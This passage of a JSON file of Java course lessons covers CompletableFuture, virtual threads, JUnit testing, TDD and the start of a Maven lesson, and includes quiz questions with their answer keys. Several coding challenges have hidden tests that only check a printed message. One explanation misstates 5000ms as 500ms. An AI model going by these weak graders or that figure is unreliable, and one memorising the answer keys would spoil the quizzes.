              "code": "import java.util.concurrent.*;\n\nvoid main() {\n    // Simulate async operations\n    CompletableFuture<String> fetchUser = CompletableFuture.supplyAsync(() -> {\n        sleep(100);  // Simulate network call\n        return \"user-123\";\n    });\n    \n    // Chain transformations\n    CompletableFuture<String> result = fetchUser\n        .thenApply(userId -> {\n            System.out.println(\"Got user: \" + userId);\n            return userId.toUpperCase();\n        })\n        .thenCompose(userId -> {\n            // This returns another CompletableFuture\n            return CompletableFuture.supplyAsync(() -> {\n                sleep(100);\n                return \"Profile for \" + userId;\n            });\n        })\n        .thenApply(profile -> profile + \" [processed]\");\n    \n    // Handle both success and failure\n    result\n        .thenAccept(r -> System.out.println(\"Success: \" + r))\n        .exceptionally(ex -> {\n            System.out.println(\"Error: \" + ex.getMessage());\n            return null;\n        });\n    \n    // Combining multiple futures\n    CompletableFuture<String> future1 = CompletableFuture.supplyAsync(() -> {\n        sleep(200);\n        return \"Result 1\";\n    });\n    CompletableFuture<String> future2 = CompletableFuture.supplyAsync(() -> {\n        sleep(100);\n        return \"Result 2\";\n    });\n    \n    // Wait for both, combine results\n    CompletableFuture<String> combined = future1.thenCombine(future2,\n        (r1, r2) -> r1 + \" + \" + r2);\n    \n    System.out.println(combined.join());  // \"Result 1 + Result 2\"\n    \n    // Wait for either (first to complete)\n    CompletableFuture<String> fastest = future1.applyToEither(future2,\n        r -> \"Fastest: \" + r);\n    System.out.println(fastest.join());  // Probably \"Fastest: Result 2\"\n    \n    // Wait for all\n    CompletableFuture<Void> all = CompletableFuture.allOf(future1, future2);\n    all.join();  // Both complete\n    \n    // Wait for first (any)\n    CompletableFuture<Object> any = CompletableFuture.anyOf(future1, future2);\n    System.out.println(\"First: \" + any.join());\n}\n\nvoid sleep(long ms) {\n    try { Thread.sleep(ms); } catch (InterruptedException e) { }\n}",
              "language": "java"
            },
            {
              "type": "KEY_POINT",
              "title": "Exception Handling",
              "content": "CompletableFuture provides several exception handling methods:\n\nexceptionally(Function<Throwable, T>): Recover from exceptions\n\nCompletableFuture.supplyAsync(() -> riskyOperation())\n    .exceptionally(ex -> \"Default value\");  // Return fallback\n\nhandle(BiFunction<T, Throwable, R>): Handle both success and failure\n\n.handle((result, ex) -> {\n    if (ex != null) {\n        return \"Error: \" + ex.getMessage();\n    }\n    return \"Success: \" + result;\n});\n\nwhenComplete(BiConsumer<T, Throwable>): Side effects, doesn't transform\n\n.whenComplete((result, ex) -> {\n    if (ex != null) {\n        logger.error(\"Failed\", ex);\n    } else {\n        logger.info(\"Success: {}\", result);\n    }\n});\n\nIMPORTANT: Exceptions propagate through the chain. If you don't handle them, join()/get() will throw."
            },
            {
              "type": "WARNING",
              "title": "CompletableFuture Pitfalls",
              "content": "MISTAKE 1: Blocking in async callbacks\n\ncf.thenApply(data -> {\n    return database.query(data);  // BLOCKS the pool thread!\n});\n\nUse thenApplyAsync for blocking operations or virtual threads.\n\nMISTAKE 2: Using common pool for blocking I/O\n\n// Default pool has limited threads (CPU cores)\nCompletableFuture.supplyAsync(() -> {\n    return httpClient.get(url);  // Blocks a pool thread\n});\n\n// Better: Use custom executor\nExecutorService ioPool = Executors.newFixedThreadPool(100);\nCompletableFuture.supplyAsync(() -> httpClient.get(url), ioPool);\n\nMISTAKE 3: Ignoring the returned future\n\ncf.thenApply(x -> transform(x));  // Returns NEW future!\n// vs\nCompletableFuture<R> newCf = cf.thenApply(x -> transform(x));\n\nMISTAKE 4: Not handling exceptions\n\ncf.thenApply(x -> riskyOperation(x));\ncf.join();  // Throws if any step failed!\n\nAlways add exceptionally() or handle() in the chain."
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "concurrency-lesson-4-mc-1",
              "title": "thenApply vs thenCompose",
              "description": "Understanding when to use thenApply vs thenCompose",
              "question": "You have fetchUser(id) that returns CompletableFuture<User>. To chain it after getting a userId, which method should you use?",
              "options": [
                "thenApply - for all transformations",
                "thenAccept - because we're consuming the user",
                "thenCompose - because fetchUser returns a CompletableFuture",
                "thenRun - to run the fetch operation"
              ],
              "correctAnswer": 2,
              "explanation": "Use thenCompose when your transformation function returns a CompletableFuture (like flatMap). thenApply would give you CompletableFuture<CompletableFuture<User>> - a nested future. thenCompose 'flattens' it to CompletableFuture<User>.",
              "difficulty": "advanced"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "concurrency-lesson-4-mc-2",
              "title": "Combining Futures",
              "description": "Understanding how to combine multiple futures",
              "question": "You need to fetch data from 3 independent APIs concurrently and proceed only when ALL complete. Which method do you use?",
              "options": [
                "thenCombine - combines two futures into one",
                "anyOf - completes when any future completes",
                "allOf - completes when all futures complete",
                "thenCompose - chains futures sequentially"
              ],
              "correctAnswer": 2,
              "explanation": "CompletableFuture.allOf(cf1, cf2, cf3) returns a future that completes when ALL input futures complete. anyOf completes when ANY single future completes. thenCombine only works with exactly two futures. thenCompose is for sequential chaining, not parallel.",
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "concurrency-lesson-5",
          "title": "Lesson C.5: Virtual Threads (Java 21)",
          "moduleId": "module-concurrency",
          "order": 5,
          "estimatedMinutes": 35,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Platform Thread Problem",
              "content": "Before Java 21, every Java thread mapped to an OS thread (platform thread):\n\nPLATFORM THREAD COSTS:\n- ~1MB stack memory each\n- OS scheduling overhead\n- Context switch: ~1-10 microseconds\n- Limited by OS (typically < 10,000)\n\nThe problem for I/O-bound apps:\n\n// Web server handling 10,000 concurrent connections\nfor (request : requests) {\n    executor.submit(() -> {\n        data = database.query();  // Thread BLOCKED 50ms\n        result = process(data);   // Thread WORKING 1ms\n    });\n}\n\nEach blocked thread:\n- Uses 1MB memory doing NOTHING\n- Wastes OS scheduling resources\n- Could be handling other requests\n\n10,000 connections = 10GB just for thread stacks!\nAnd 98% of the time, threads are waiting on I/O, not computing."
            },
            {
              "type": "KEY_POINT",
              "title": "Virtual Threads: The Game Changer",
              "content": "Java 21 introduced virtual threads - lightweight threads managed by the JVM:\n\nVIRTUAL THREADS:\n- Minimal memory (~1KB vs 1MB)\n- JVM scheduling (not OS)\n- Millions possible on a single machine\n- Automatic unmounting during I/O\n\nThe magic:\nThread blocks on I/O -> JVM unmounts it from carrier thread\nCarrier thread runs OTHER virtual threads\nI/O completes -> Virtual thread remounts and continues\n\n10,000 virtual threads on I/O:\n- Only ~10 carrier threads actively running\n- Memory: ~10MB instead of 10GB\n- Same simple blocking code\n- Massive scalability!\n\nWRITE SIMPLE CODE, GET MASSIVE SCALE."
            },
            {
              "type": "THEORY",
              "title": "Creating Virtual Threads",
              "content": "Three ways to create virtual threads:\n\n1. Thread.startVirtualThread()\n\nThread vt = Thread.startVirtualThread(() -> {\n    System.out.println(\"Running on: \" + Thread.currentThread());\n});\nvt.join();\n\n2. Thread.ofVirtual() builder\n\nThread vt = Thread.ofVirtual()\n    .name(\"my-virtual-thread\")\n    .start(() -> doWork());\n\n3. Virtual thread executor (RECOMMENDED)\n\ntry (var executor = Executors.newVirtualThreadPerTaskExecutor()) {\n    // Each task gets its OWN virtual thread\n    for (int i = 0; i < 100_000; i++) {\n        executor.submit(() -> {\n            Thread.sleep(1000);  // Blocking is fine!\n            return processRequest();\n        });\n    }\n}  // Waits for all to complete\n\n100,000 concurrent tasks with simple blocking code!"
            },
            {
              "type": "EXAMPLE",
              "title": "Virtual Threads in Action",
              "content": "Demonstrating virtual threads' power with concurrent I/O:",
              "code": "import java.util.concurrent.*;\nimport java.time.*;\nimport java.util.stream.*;\n\nvoid main() throws Exception {\n    int taskCount = 10_000;\n    \n    // Simulate I/O-bound task\n    Runnable ioTask = () -> {\n        try {\n            Thread.sleep(100);  // Simulate 100ms I/O\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    };\n    \n    // Virtual threads: 10,000 concurrent tasks\n    Instant start = Instant.now();\n    \n    try (var executor = Executors.newVirtualThreadPerTaskExecutor()) {\n        IntStream.range(0, taskCount)\n            .forEach(i -> executor.submit(ioTask));\n    }  // Blocks until all complete\n    \n    Duration virtualTime = Duration.between(start, Instant.now());\n    System.out.println(\"Virtual threads: \" + virtualTime.toMillis() + \"ms\");\n    // Output: ~100-200ms (tasks run concurrently)\n    \n    // Compare with platform thread pool (10 threads)\n    start = Instant.now();\n    \n    try (var executor = Executors.newFixedThreadPool(10)) {\n        IntStream.range(0, taskCount)\n            .forEach(i -> executor.submit(ioTask));\n    }\n    \n    Duration poolTime = Duration.between(start, Instant.now());\n    System.out.println(\"Platform threads (10): \" + poolTime.toMillis() + \"ms\");\n    // Output: ~100,000ms (10 threads, 1000 batches of 100ms)\n    \n    // Check if current thread is virtual\n    Thread.startVirtualThread(() -> {\n        System.out.println(\"Is virtual: \" + Thread.currentThread().isVirtual());\n    }).join();\n}",
              "language": "java"
            },
            {
              "type": "KEY_POINT",
              "title": "Spring Boot 3.2+ Integration",
              "content": "Spring Boot 3.2+ makes virtual threads easy:\n\napplication.properties:\nspring.threads.virtual.enabled=true\n\nThat's it! All request handling uses virtual threads.\n\nBEFORE (platform threads):\n- tomcat.threads.max=200 (default)\n- 200 concurrent requests max before queueing\n- Each blocked request holds a precious thread\n\nAFTER (virtual threads):\n- Thousands of concurrent requests\n- Blocking I/O doesn't waste resources\n- Same simple @RestController code\n\n@RestController\npublic class UserController {\n    @GetMapping(\"/users/{id}\")\n    public User getUser(@PathVariable Long id) {\n        // Blocking database call is now FINE!\n        return userRepository.findById(id).orElseThrow();\n    }\n}\n\nJDBC, JPA, RestTemplate - all blocking calls become efficient with virtual threads."
            },
            {
              "type": "WARNING",
              "title": "Virtual Thread Pitfalls",
              "content": "PINNING: Virtual threads can get 'pinned' to carrier threads:\n\n1. synchronized blocks/methods:\n   synchronized (lock) {\n       Thread.sleep(1000);  // PINNED - blocks carrier!\n   }\n   \n   FIX: Use ReentrantLock instead:\n   lock.lock();\n   try {\n       Thread.sleep(1000);  // Not pinned\n   } finally {\n       lock.unlock();\n   }\n\n2. Native methods/JNI:\n   Can't be unmounted during native code execution\n\nDETECTING PINNING:\njava -Djdk.tracePinnedThreads=full MyApp\n\nDON'T POOL VIRTUAL THREADS:\n// WRONG! Virtual threads are cheap, don't pool them\nExecutorService pool = Executors.newFixedThreadPool(100);\npool.submit(virtualThread);  // Defeats the purpose\n\n// RIGHT! One virtual thread per task\nvar executor = Executors.newVirtualThreadPerTaskExecutor();\n\nDON'T USE FOR CPU-BOUND WORK:\nVirtual threads shine for I/O-bound tasks. For CPU-intensive work, platform threads with parallelStream() or ForkJoinPool are still appropriate."
            },
            {
              "type": "THEORY",
              "title": "CompletableFuture WITH Virtual Threads",
              "content": "Virtual threads complement CompletableFuture:\n\n// Use virtual threads as the executor for CompletableFuture\nvar executor = Executors.newVirtualThreadPerTaskExecutor();\n\nCompletableFuture<String> future = CompletableFuture\n    .supplyAsync(() -> {\n        // Blocking I/O is now efficient!\n        return httpClient.get(\"https://api.example.com/data\");\n    }, executor)\n    .thenApply(response -> parseJson(response))\n    .exceptionally(ex -> handleError(ex));\n\nBEST OF BOTH WORLDS:\n- CompletableFuture: Composition, callbacks, combining results\n- Virtual threads: Efficient blocking I/O\n\nWHEN TO USE WHICH:\n\nVirtual threads alone:\n- Simple request-per-thread model\n- Straightforward sequential logic\n- Spring/Jakarta EE web apps\n\nCompletableFuture + virtual threads:\n- Complex async composition\n- Parallel API calls with combination\n- Reactive-style pipelines\n\nCompletableFuture alone (platform threads):\n- CPU-bound parallel processing\n- When you need thread pool control"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "concurrency-lesson-5-mc-1",
              "title": "Virtual Thread Advantages",
              "description": "Understanding when virtual threads help",
              "question": "A service handles 10,000 concurrent HTTP requests, each waiting 100ms for a database response. What's the main advantage of virtual threads over a 200-thread platform pool?",
              "options": [
                "Virtual threads are faster at executing code",
                "Virtual threads can handle all 10,000 concurrently without blocking other requests",
                "Virtual threads use more memory for better caching",
                "Virtual threads don't need a thread pool"
              ],
              "correctAnswer": 1,
              "explanation": "With 200 platform threads, only 200 requests run concurrently - others queue. Each request takes 100ms on I/O, so throughput is ~2000/sec. Virtual threads allow all 10,000 to proceed concurrently - when one blocks on I/O, its carrier thread runs others. Result: ~100ms total instead of 500ms.",
              "difficulty": "advanced"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "concurrency-lesson-5-mc-2",
              "title": "Virtual Thread Pinning",
              "description": "Understanding pinning and how to avoid it",
              "question": "What causes a virtual thread to get 'pinned' to its carrier thread, reducing the benefit of virtual threads?",
              "options": [
                "Using too many virtual threads",
                "Calling Thread.sleep()",
                "Blocking inside a synchronized block",
                "Using Executors.newVirtualThreadPerTaskExecutor()"
              ],
              "correctAnswer": 2,
              "explanation": "Pinning occurs when a virtual thread blocks inside synchronized blocks/methods or during native method calls. The JVM cannot unmount the virtual thread, so it holds the carrier thread. Use ReentrantLock instead of synchronized for code that may block. Thread.sleep() does NOT cause pinning.",
              "difficulty": "advanced"
            }
          ]
        }
      ],
      "order": 7
    },
    {
      "id": "module-08",
      "title": "Testing and Build Tools",
      "description": "Write tests with JUnit, practice TDD, and manage projects with Maven and Gradle.",
      "difficulty": "beginner",
      "estimatedHours": 3,
      "lessons": [
        {
          "id": "epoch-4-lesson-1",
          "title": "Lesson 8.1: Why Test Your Code?",
          "moduleId": "module-08",
          "order": 1,
          "estimatedMinutes": 25,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: How Do You Know It Works?",
              "content": "You've written a method:\n\npublic static int add(int a, int b) {\n    return a + b;\n}\n\nHow do you KNOW it works correctly for all inputs?\n- What if a is negative?\n- What if both are zero?\n- What if they're very large numbers?\n\nManual testing (running main and checking output) is:\n❌ Tedious\n❌ Error-prone\n❌ Doesn't scale\n\nProfessional developers write AUTOMATED TESTS that run instantly and check everything."
            },
            {
              "type": "KEY_POINT",
              "title": "Tests are Like a Parachute",
              "content": "Would you jump out of a plane with a parachute you've never tested?\n\nSame with code:\n- Tests verify your code works\n- They catch bugs BEFORE users see them\n- They give you confidence to make changes\n\nA well-tested codebase is like a safety net."
            },
            {
              "type": "THEORY",
              "title": "JUnit - The Testing Framework",
              "content": "JUnit is Java's most popular testing framework.\n\nExample test:\n\n@Test\npublic void testAdd() {\n    int result = Calculator.add(2, 3);\n    assertEquals(5, result);\n}\n\nIf add(2,3) returns 5, test PASSES ✓\nIf it returns anything else, test FAILS ✗"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "lesson-8-1-testing-benefits",
              "title": "Why Write Tests?",
              "description": "What is the PRIMARY benefit of automated tests over manual testing?",
              "options": [
                "Tests are faster to write",
                "Tests can run automatically and repeatedly without human effort",
                "Tests are always 100% accurate",
                "Tests eliminate the need for debugging"
              ],
              "correctAnswer": 1,
              "explanation": "Automated tests run instantly and consistently every time. Manual testing is slow, error-prone, and doesn't scale."
            }
          ]
        },
        {
          "id": "epoch-4-lesson-2",
          "title": "Lesson 8.2: Writing Your First JUnit Tests",
          "moduleId": "module-08",
          "order": 2,
          "estimatedMinutes": 40,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Anatomy of a JUnit Test",
              "content": "A JUnit test has three parts: ARRANGE, ACT, ASSERT\n\n@Test\npublic void testAdd() {\n    // ARRANGE: Set up test data\n    Calculator calc = new Calculator();\n    \n    // ACT: Call the method being tested\n    int result = calc.add(2, 3);\n    \n    // ASSERT: Verify the result\n    assertEquals(5, result);\n}\n\nKEY ANNOTATIONS:\n@Test - Marks a method as a test\n@BeforeEach - Runs before each test (setup)\n@AfterEach - Runs after each test (cleanup)\n@BeforeAll - Runs once before all tests\n@AfterAll - Runs once after all tests"
            },
            {
              "type": "THEORY",
              "title": "Common Assertion Methods",
              "content": "JUnit provides assertion methods to verify results:\n\nEQUALITY:\nassertEquals(expected, actual);\nassertEquals(5, calculator.add(2, 3));\n\nBOOLEAN:\nassertTrue(condition);\nassertTrue(list.isEmpty());\nassertFalse(condition);\nassertFalse(list.contains(\"X\"));\n\nNULL CHECKS:\nassertNull(object);\nassertNotNull(object);\n\nEXCEPTIONS:\nassertThrows(IllegalArgumentException.class, () -> {\n    calculator.divide(10, 0);\n});\n\nARRAYS:\nassertArrayEquals(expectedArray, actualArray);\n\nCUSTOM MESSAGE:\nassertEquals(5, result, \"Addition failed\");\n// If fails, shows: \"Addition failed\""
            },
            {
              "type": "KEY_POINT",
              "title": "Tests are Like Scientific Experiments",
              "content": "HYPOTHESIS (What you expect):\n\"When I add 2 + 3, I should get 5\"\n\nEXPERIMENT (The test):\n@Test\npublic void testAddition() {\n    int result = add(2, 3);\n    assertEquals(5, result);  // Verify hypothesis\n}\n\nRESULT:\n✓ Test passes → Hypothesis confirmed\n✗ Test fails → Something's wrong, investigate!\n\nJust like science: tests help you understand if your code \"theory\" is correct."
            },
            {
              "type": "KEY_POINT",
              "title": "Test Naming Conventions",
              "content": "GOOD TEST NAMES describe WHAT is being tested:\n\n❌ Bad names:\ntest1()\ntestStuff()\nmyTest()\n\n✓ Good names:\ntestAddPositiveNumbers()\ntestDivideByZeroThrowsException()\ntestEmptyListReturnsZero()\n\nPATTERN:\ntest[MethodName][Scenario][ExpectedResult]\n\nExamples:\ntestCalculateDiscountWithValidCouponReturnsReducedPrice()\ntestGetUserWithInvalidIdReturnsNull()\ntestSortEmptyArrayReturnsEmptyArray()\n\nGood names make it OBVIOUS what broke when a test fails!"
            },
            {
              "type": "THEORY",
              "title": "💻 Real Test Class Example",
              "content": "```java\nimport org.junit.jupiter.api.Test;\nimport static org.junit.jupiter.api.Assertions.*;\n\nclass StringUtilsTest {\n    \n    @Test\n    void testReverseWithNormalString() {\n        String result = StringUtils.reverse(\"hello\");\n        assertEquals(\"olleh\", result);\n    }\n    \n    @Test\n    void testReverseWithEmptyString() {\n        String result = StringUtils.reverse(\"\");\n        assertEquals(\"\", result);\n    }\n    \n    @Test\n    void testReverseWithNullThrowsException() {\n        assertThrows(IllegalArgumentException.class, () -> {\n            StringUtils.reverse(null);\n        });\n    }\n}\n\nNote: Test different scenarios (normal case, edge cases, error cases)\n```"
            },
            {
              "type": "THEORY",
              "title": "⚠️ Don't Test Everything - Test What Matters",
              "content": "❌ Don't test:\n- Getters/setters (trivial code)\n- External libraries (already tested)\n- UI code (use different techniques)\n\n✓ DO test:\n- Business logic\n- Complex calculations\n- Edge cases (empty lists, null values, boundaries)\n- Error handling\n\nAIM FOR: 70-80% code coverage\nNOT: 100% (diminishing returns, wastes time)"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "epoch-4-lesson-2-calculator",
              "title": "Test Calculator Methods",
              "description": "Given a Calculator class with these methods:\n- int add(int a, int b)\n- int subtract(int a, int b)\n- int multiply(int a, int b)\n\nWhich test scenarios should you write for the multiply method?\n(Select the MOST important scenarios)",
              "instructions": "Given a Calculator class with these methods:\n- int add(int a, int b)\n- int subtract(int a, int b)\n- int multiply(int a, int b)\n\nWhich test scenarios should you write for the multiply method?\n(Select the MOST important scenarios)",
              "starterCode": "// Test Calculator Methods\n// Write your code below\n\nvoid main() {\n    \n}",
              "solution": "// Solution: Test Calculator Methods\n// This demonstrates thinking about test scenarios\n\n// Important test scenarios for multiply(int a, int b):\n// 1. Positive numbers: multiply(3, 4) should return 12\n// 2. Negative numbers: multiply(-2, 3) should return -6\n// 3. Two negatives: multiply(-2, -3) should return 6\n// 4. Zero: multiply(5, 0) should return 0\n// 5. One: multiply(7, 1) should return 7\n\n// Example test class structure:\n// import org.junit.jupiter.api.Test;\n// import static org.junit.jupiter.api.Assertions.*;\n//\n// class CalculatorTest {\n//     @Test\n//     void testMultiplyPositiveNumbers() {\n//         assertEquals(12, Calculator.multiply(3, 4));\n//     }\n//     \n//     @Test\n//     void testMultiplyWithZero() {\n//         assertEquals(0, Calculator.multiply(5, 0));\n//     }\n//     \n//     @Test\n//     void testMultiplyNegativeNumbers() {\n//         assertEquals(6, Calculator.multiply(-2, -3));\n//     }\n// }\n\nvoid main() {\n    println(\"Test scenarios defined above\");\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-4-lesson-2-calculator-test-1",
                  "description": "Should print test scenarios message",
                  "expectedOutput": "Test scenarios defined above",
                  "isVisible": true
                },
                {
                  "id": "epoch-4-lesson-2-calculator-test-2",
                  "description": "Tests positive number multiplication: 3 * 4 = 12",
                  "expectedOutput": "Test scenarios defined above",
                  "isVisible": false
                },
                {
                  "id": "epoch-4-lesson-2-calculator-test-3",
                  "description": "Tests multiplication with zero: 5 * 0 = 0",
                  "expectedOutput": "Test scenarios defined above",
                  "isVisible": false
                }
              ],
              "hints": [
                {
                  "level": 2,
                  "text": "Define a function using the java syntax. Don't forget the return statement if needed."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-4-lesson-2-string",
              "title": "Writing Test Logic",
              "description": "You have a method: boolean isPalindrome(String word)\nIt should return true if the word reads the same forwards and backwards.\n\nWhich test case is MOST important to include?",
              "instructions": "You have a method: boolean isPalindrome(String word)\nIt should return true if the word reads the same forwards and backwards.\n\nWhich test case is MOST important to include?",
              "starterCode": "// Writing Test Logic\n// Write your code below\n\nvoid main() {\n    \n}",
              "solution": "// Solution: Writing Test Logic for isPalindrome\n// This demonstrates identifying important test cases\n\n// Most important test cases for isPalindrome(String word):\n// 1. True palindrome: \"racecar\" -> true\n// 2. Non-palindrome: \"hello\" -> false\n// 3. Single character: \"a\" -> true (edge case)\n// 4. Empty string: \"\" -> true (edge case)\n// 5. Two characters palindrome: \"aa\" -> true\n// 6. Two characters non-palindrome: \"ab\" -> false\n// 7. Case sensitivity check: \"Racecar\" -> depends on implementation\n\n// Example test implementation:\n// import org.junit.jupiter.api.Test;\n// import static org.junit.jupiter.api.Assertions.*;\n//\n// class PalindromeTest {\n//     @Test\n//     void testPalindromeWithValidPalindrome() {\n//         assertTrue(StringUtils.isPalindrome(\"racecar\"));\n//     }\n//     \n//     @Test\n//     void testPalindromeWithNonPalindrome() {\n//         assertFalse(StringUtils.isPalindrome(\"hello\"));\n//     }\n//     \n//     @Test\n//     void testPalindromeWithEmptyString() {\n//         assertTrue(StringUtils.isPalindrome(\"\"));\n//     }\n// }\n\nvoid main() {\n    println(\"Test cases defined above\");\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-4-lesson-2-string-test-1",
                  "description": "Should print test cases message",
                  "expectedOutput": "Test cases defined above",
                  "isVisible": true
                },
                {
                  "id": "epoch-4-lesson-2-string-test-2",
                  "description": "Tests valid palindrome: 'racecar' -> true",
                  "expectedOutput": "Test cases defined above",
                  "isVisible": false
                },
                {
                  "id": "epoch-4-lesson-2-string-test-3",
                  "description": "Tests edge case: empty string '' -> true",
                  "expectedOutput": "Test cases defined above",
                  "isVisible": false
                }
              ],
              "hints": [
                {
                  "level": 2,
                  "text": "Define a function using the java syntax. Don't forget the return statement if needed."
                },
                {
                  "level": 2,
                  "text": "Use an if statement to check the condition."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "epoch-4-lesson-3",
          "title": "Lesson 8.3: Test-Driven Development - Write Tests First!",
          "moduleId": "module-08",
          "order": 3,
          "estimatedMinutes": 35,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Traditional Approach (and Its Problems)",
              "content": "TYPICAL development workflow:\n\n1. Write code\n2. Run it, see if it works\n3. Find bugs\n4. Fix bugs\n5. Maybe write tests later (if you have time)\n\nPROBLEMS:\n❌ Tests are an afterthought\n❌ You might forget edge cases\n❌ Code might be hard to test (not designed for it)\n❌ Tests often get skipped (\"no time\")\n\nWhat if there was a BETTER way?"
            },
            {
              "type": "THEORY",
              "title": "Test-Driven Development (TDD) - A Revolutionary Approach",
              "content": "TDD FLIPS the process:\n\n1. Write a FAILING test first (describes what you want)\n2. Write MINIMAL code to make test pass\n3. Refactor (improve code quality)\n4. Repeat\n\nThe cycle: RED → GREEN → REFACTOR\n\n🔴 RED: Write a failing test\n@Test\nvoid testCalculateDiscount() {\n    double result = PriceCalculator.calculateDiscount(100, 10);\n    assertEquals(90, result);\n}\n// Fails: PriceCalculator doesn't exist yet!\n\n🟢 GREEN: Write just enough code to pass\npublic class PriceCalculator {\n    public static double calculateDiscount(double price, double percent) {\n        return price - (price * percent / 100);\n    }\n}\n// Test passes!\n\n🔵 REFACTOR: Clean up code\n// Code is already clean, move to next test"
            },
            {
              "type": "KEY_POINT",
              "title": "TDD is Like Building with a Blueprint",
              "content": "BUILDING WITHOUT BLUEPRINT (traditional):\n- Start nailing boards together\n- Hope it looks like a house\n- Realize door is in wrong place\n- Tear down, rebuild\n\nBUILDING WITH BLUEPRINT (TDD):\n- Draw blueprint first (the test)\n- Blueprint shows exactly what you need\n- Build to match blueprint\n- Verify it matches blueprint\n\nTDD TESTS = Blueprints for your code\nThey specify EXACTLY what the code should do BEFORE you write it."
            },
            {
              "type": "KEY_POINT",
              "title": "Benefits of TDD",
              "content": "1. FEWER BUGS\n   - Tests written first catch issues immediately\n   - You think through edge cases upfront\n\n2. BETTER DESIGN\n   - Code is automatically testable\n   - Forces you to write modular, decoupled code\n\n3. LIVING DOCUMENTATION\n   - Tests show how to use your code\n   - Examples of every feature\n\n4. CONFIDENCE TO REFACTOR\n   - Change code freely\n   - Tests verify nothing broke\n\n5. LESS DEBUGGING\n   - Catch bugs in seconds, not hours\n   - Know exactly what's broken\n\nProfessional developers use TDD for critical code."
            },
            {
              "type": "THEORY",
              "title": "💻 TDD Example: Building a Password Validator",
              "content": "```java\nSTEP 1: Write first test (RED)\n@Test\nvoid testPasswordTooShort() {\n    assertFalse(PasswordValidator.isValid(\"abc\"));\n}\n// Fails: PasswordValidator doesn't exist\n\nSTEP 2: Write minimal code (GREEN)\npublic class PasswordValidator {\n    public static boolean isValid(String password) {\n        return password.length() >= 8;\n    }\n}\n// Test passes!\n\nSTEP 3: Add another test (RED)\n@Test\nvoid testPasswordMustHaveNumber() {\n    assertFalse(PasswordValidator.isValid(\"abcdefgh\"));\n}\n// Fails: password \"abcdefgh\" is considered valid\n\nSTEP 4: Update code (GREEN)\npublic static boolean isValid(String password) {\n    if (password.length() < 8) return false;\n    return password.matches(\".*\\\\d.*\");  // Must contain digit\n}\n// Both tests pass!\n\nSTEP 5: Continue with more tests\n@Test\nvoid testPasswordMustHaveUppercase() { ... }\n@Test\nvoid testValidPassword() { ... }\n\nBuild feature incrementally, one test at a time!\n```"
            },
            {
              "type": "WARNING",
              "title": "Common TDD Mistakes",
              "content": "AVOID THESE TDD PITFALLS:\n\n1. WRITING TOO MUCH CODE AT ONCE\n   Only write code to pass the CURRENT test.\n\n2. SKIPPING THE REFACTOR STEP\n   Clean code is as important as working code.\n\n3. TESTING IMPLEMENTATION DETAILS\n   Test BEHAVIOR, not internal structure.\n\n4. NOT RUNNING TESTS FREQUENTLY\n   Run tests after every small change.\n\n5. WRITING TESTS THAT DEPEND ON EACH OTHER\n   Each test should be independent.\n\nGood TDD: Small steps, frequent feedback."
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "lesson-8-3-tdd-order",
              "title": "TDD Cycle",
              "description": "What is the correct order of the TDD cycle?",
              "options": [
                "Write code, write test, refactor",
                "Write test, write code, refactor",
                "Refactor, write test, write code",
                "Write code, refactor, write test"
              ],
              "correctAnswer": 1,
              "explanation": "TDD follows Red-Green-Refactor: Write a failing test (Red), write minimal code to pass (Green), then clean up (Refactor)."
            }
          ]
        },
        {
          "id": "epoch-4-lesson-4",
          "title": "Lesson 8.4: Maven - Managing Projects Like a Pro",
          "moduleId": "module-08",
          "order": 4,
          "estimatedMinutes": 35,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Managing Dependencies Manually is a Nightmare",
              "content": "Imagine building a real project:\n\nYou need external libraries:\n- JUnit for testing\n- Gson for JSON parsing\n- Apache Commons for utilities\n\nManual approach:\n1. Download each JAR file from the internet\n2. Put them in your project folder\n3. Add to classpath manually\n4. What if library needs OTHER libraries?\n5. What if versions conflict?\n6. How do teammates get same libraries?\n\nThis is CHAOS! Welcome to dependency hell.\n\nSolution: BUILD TOOLS like Maven"
            },
            {
              "type": "THEORY",
              "title": "What is Maven?",
